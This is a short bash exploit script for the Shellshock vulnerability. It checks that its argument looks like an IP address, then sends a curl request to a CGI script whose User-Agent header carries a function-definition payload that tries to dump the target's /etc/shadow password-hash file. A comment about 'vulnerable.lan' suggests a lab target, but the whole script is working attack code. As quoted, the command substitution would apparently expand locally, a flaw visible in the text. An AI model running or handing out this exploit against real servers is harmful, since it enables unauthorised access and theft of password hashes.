#!/bin/bash

usage(){
	echo "Usage: $0 ip_address"
	exit 1
}

ip=$1

if ! [[ $ip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
  echo $1 "not a valid ip adress"
  usage
  exit 2
fi

# create vulnerable.lan & replace IP with that name
curl 'http://'$ip'/cgi-bin/shell.sh' -H "User-Agent: () { :;}; /bin/echo -e \"Content-Type: text/plain\r\n\r\n$(/bin/cat /etc/shadow)\""
